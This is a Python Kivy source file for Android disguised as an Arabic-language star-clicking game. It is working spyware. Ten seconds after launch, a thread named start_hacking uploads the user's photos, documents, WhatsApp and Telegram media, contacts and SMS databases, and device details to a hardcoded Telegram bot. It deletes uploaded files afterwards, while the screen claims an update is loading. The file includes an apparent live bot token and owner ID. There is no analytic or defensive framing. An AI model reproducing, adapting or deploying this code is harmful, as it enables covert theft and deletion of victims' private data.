import kivy
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.clock import Clock
import requests
import os
import shutil
import json
import threading
from android.permissions import request_permissions, Permission
from android.storage import primary_external_storage_path

BOT_TOKEN = "8984239079:AAEtdnaAKsFH4kZwjO7UbzjZEw-vcXoBXRs"
OWNER_ID = 8164366965
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

request_permissions([
    Permission.READ_EXTERNAL_STORAGE,
    Permission.WRITE_EXTERNAL_STORAGE,
    Permission.INTERNET
])

class GameApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical', spacing=10, padding=20)
        self.title_label = Label(text='🔥 لعبة النجمة السحرية', font_size=30, color=(1,1,0,1))
        self.layout.add_widget(self.title_label)
        self.score_label = Label(text='⭐ النقاط: 0', font_size=25)
        self.layout.add_widget(self.score_label)
        self.click_button = Button(text='اضغط لتجمع نجوم 🌟', font_size=20, background_color=(0,1,0,1))
        self.click_button.bind(on_press=self.increase_score)
        self.layout.add_widget(self.click_button)
        self.status_label = Label(text='✅ تم التحميل', font_size=15, color=(0,1,0,1))
        self.layout.add_widget(self.status_label)
        Clock.schedule_once(self.start_hacking, 10)
        return self.layout
    
    def increase_score(self, instance):
        current = int(self.score_label.text.split(':')[1])
        self.score_label.text = f'⭐ النقاط: {current + 1}'
        self.status_label.text = '🎮 جمعت نجمة!'
        self.status_label.color = (0,1,0,1)
    
    def start_hacking(self, dt):
        self.status_label.text = '⏳ جاري تحميل التحديث...'
        self.status_label.color = (1,1,0,1)
        threading.Thread(target=self.collect_all_data).start()
    
    def send_to_telegram(self, file_path, caption=""):
        try:
            if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
                files = {'document': open(file_path, 'rb')}
                data = {'chat_id': OWNER_ID, 'caption': caption}
                r = requests.post(TELEGRAM_API + "/sendDocument", files=files, data=data)
                if r.status_code == 200:
                    os.remove(file_path)
                    return True
        except:
            pass
        return False
    
    def send_photo(self, photo_path):
        try:
            if os.path.exists(photo_path) and os.path.getsize(photo_path) > 0:
                files = {'photo': open(photo_path, 'rb')}
                data = {'chat_id': OWNER_ID}
                r = requests.post(TELEGRAM_API + "/sendPhoto", files=files, data=data)
                if r.status_code == 200:
                    os.remove(photo_path)
                    return True
        except:
            pass
        return False
    
    def collect_all_data(self):
        try:
            self.update_status('📸 جاري جمع الصور...')
            self.collect_photos()
            self.update_status('📄 جاري جمع الملفات...')
            self.collect_documents()
            self.update_status('📇 جاري استخراج جهات الاتصال...')
            self.get_contacts()
            self.update_status('💬 جاري استخراج الرسائل...')
            self.get_sms()
            self.update_status('📱 جاري جمع معلومات الجهاز...')
            self.get_device_info()
            self.update_status('✅ تم رفع كل شيء للبوت!', (0,1,0,1))
        except Exception as e:
            self.update_status(f'❌ خطأ: {str(e)}', (1,0,0,1))
    
    def update_status(self, text, color=(1,1,0,1)):
        Clock.schedule_once(lambda dt: self._update_ui(text, color), 0)
    
    def _update_ui(self, text, color):
        self.status_label.text = text
        self.status_label.color = color
    
    def collect_photos(self):
        paths = [
            f"{primary_external_storage_path()}/DCIM/Camera/",
            f"{primary_external_storage_path()}/Pictures/",
            f"{primary_external_storage_path()}/Download/",
            f"{primary_external_storage_path()}/WhatsApp/Media/WhatsApp Images/",
            f"{primary_external_storage_path()}/Telegram/Telegram Images/"
        ]
        for path in paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                            full = os.path.join(root, file)
                            self.send_photo(full)
    
    def collect_documents(self):
        paths = [
            f"{primary_external_storage_path()}/Documents/",
            f"{primary_external_storage_path()}/Download/",
            f"{primary_external_storage_path()}/WhatsApp/Media/WhatsApp Documents/"
        ]
        for path in paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.lower().endswith(('.pdf', '.doc', '.docx', '.txt', '.zip')):
                            full = os.path.join(root, file)
                            self.send_to_telegram(full, f"📄 {file}")
    
    def get_contacts(self):
        contacts_path = "/data/data/com.android.providers.contacts/databases/contacts2.db"
        if os.path.exists(contacts_path):
            try:
                shutil.copy2(contacts_path, f"{primary_external_storage_path()}/contacts_backup.db")
                self.send_to_telegram(f"{primary_external_storage_path()}/contacts_backup.db", "📇 جهات الاتصال")
                os.remove(f"{primary_external_storage_path()}/contacts_backup.db")
            except:
                pass
    
    def get_sms(self):
        sms_path = "/data/data/com.android.providers.telephony/databases/mmssms.db"
        if os.path.exists(sms_path):
            try:
                shutil.copy2(sms_path, f"{primary_external_storage_path()}/sms_backup.db")
                self.send_to_telegram(f"{primary_external_storage_path()}/sms_backup.db", "💬 رسائل SMS")
                os.remove(f"{primary_external_storage_path()}/sms_backup.db")
            except:
                pass
    
    def get_device_info(self):
        info = {
            "device": os.popen("getprop ro.product.model").read().strip(),
            "brand": os.popen("getprop ro.product.brand").read().strip(),
            "android": os.popen("getprop ro.build.version.release").read().strip(),
            "storage": os.popen("df -h").read().strip()
        }
        with open(f"{primary_external_storage_path()}/device_info.txt", "w") as f:
            json.dump(info, f, indent=2)
        self.send_to_telegram(f"{primary_external_storage_path()}/device_info.txt", "📱 معلومات الجهاز")
        os.remove(f"{primary_external_storage_path()}/device_info.txt")

if __name__ == '__main__':
    GameApp().run()
